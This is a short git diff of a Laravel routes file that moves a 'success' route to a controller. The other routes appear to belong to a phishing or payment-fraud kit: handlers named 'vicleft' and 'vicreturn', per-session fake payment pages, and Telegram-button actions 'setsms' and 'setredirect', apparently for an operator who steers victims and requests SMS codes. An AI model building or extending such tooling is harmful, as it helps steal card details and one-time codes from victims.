@@ -25,9 +25,7 @@ Route::post('/{session}/left', [App\Http\Controllers\payment::class, 'vicleft'])
 Route::post('/{session}/return', [App\Http\Controllers\payment::class, 'vicreturn'])->name('return');
 Route::get('/{session}/payment', [App\Http\Controllers\payment::class, 'index'])->name('paymentget');
 Route::get("/{session}/testup", [App\Http\Controllers\TelegramController::class, 'index'])->name('getup');
-Route::get('/{session}/success', function () {
-    return view('success');
-})->name('success');
+Route::get('/{session}/success', [App\Http\Controllers\successController::class, 'index'])->name('success');
 Route::get("/{session}/resend", [App\Http\Controllers\payment::class, 'resend'])->name('resend');
 Route::get("/{session}/setsms", [App\Http\Controllers\telegramButtonsController::class, 'setsms'])->name('setsms');
 Route::get("/{session}/setredirect", [App\Http\Controllers\telegramButtonsController::class, 'setredirect'])->name('setredirect');
